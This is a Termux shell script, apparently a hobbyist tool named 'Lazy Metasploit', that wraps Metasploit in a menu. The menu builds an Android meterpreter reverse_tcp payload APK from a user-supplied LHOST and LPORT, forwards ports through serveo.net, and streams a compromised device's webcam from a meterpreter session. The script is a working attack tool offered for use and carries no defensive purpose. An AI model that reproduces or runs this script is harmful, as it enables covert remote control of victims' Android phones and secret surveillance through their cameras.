$bin
red='\033[1;31m'
blue='\033[1;34m'
white='\033[1;37m'
green='\033[1;32m'
clear
printf "$blue"
echo "///////////////////////////////////////"
printf "$white"
echo "          Lazy Metasploit"
echo "     This tool is for only Termux"
echo "       YouTube-:GamersTech330"
echo "     Instagram-:@aniketstark330"
printf "$red"
echo "		    2.0			    "
printf "$blue"
echo "///////////////////////////////////////"
printf "$white"
echo "1. Create Android Payload"
echo "2. Launch Msfconsole"
echo "3. Set default Value in msfconsole"
echo "4. Start MsfConsole with Default Value"
echo "5. Fix Database"
echo "6. Start TCP Port Forwarding"
echo "7. Start Webcam Stream"
echo "8. About"
printf "$blue"
echo "//////////////////////////////////////"

read -p ">|" o
if [ $o = "1" ]
then
printf "$blue"
echo "what is lhost"
printf "$white"
read -p ">|" lh1
printf "$blue"
echo "what is lport"
printf "$white"
read -p ">|" lp1
printf "$blue"
echo "set apk name"
echo "Just write apk name with no /sdcard/ and .apk ok!" | pv -qL 10
printf "$white"
read -p ">|" st1
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh1 LPORT=$lp1 R > /sdcard/$st1.apk
elif [ $o = "2" ]
then
clear
msfconsole
elif [ $o = "3" ]
then
printf "$green"
echo "write your default exploit"
read -p ">|" ex1
echo "$ex1" > msfdata
echo "write your default Lhost"
read -p ">|" ex2
echo "$ex2" >> msfdata
echo "write your default Lport"
read -p ">|" ex3
echo "$ex3" >> msfdata
elif [ $o = "4" ]
then
msfconsole -r $HOME/LazyMeta/msfdata
elif [ $o = "5" ]
then
printf "$green"
echo "FIXING"
mkdir -p $PREFIX/var/lib/postgresql
initdb $PREFIX/var/lib/postgresql
pg_ctl -D $PREFIX/var/lib/postgresql start
echo "FIXED"
elif [ $o = "6" ]
then
printf "$green"
echo "set port"
read -p ">|" p1
ssh -R $p1:localhost:$p1 serveo.net
elif [ $o = "7" ]
then
rm -rf /sdcard/streamh
mkdir /sdcard/streamh
echo "in the msfconsole when you got metepreter session 
jsut copy paste this comand are given below and when we say
hit enter then enter ok now just only copy paste it" | pv -qL 10
printf "$white"
echo "webcam_stream -s /sdcard/streamh/stream.jpeg" | pv -qL 10
sleep 10
cp $HOME/LazyMeta/.stream/index.html /sdcard/streamh/
printf "$green"
echo "now we will ask you which browser open  this link
just  wait when server start then refresh that page ok" | pv -qL 10
termux-open-url http://localhost:4444/index.html
printf "$green"
echo "now you pasted command in meterepreter session just hit
ENTER NOWWWW" | pv -qL 10
echo "server starting  refresh page now" | pv -qL 10
php -S localhost:4444 -t /sdcard/streamh/
elif [ $o = "8" ]
then
termux-open-url https://gamerstech330.blogspot.com/2019/06/how-to-install-lazymeta-in-termux.html
fi
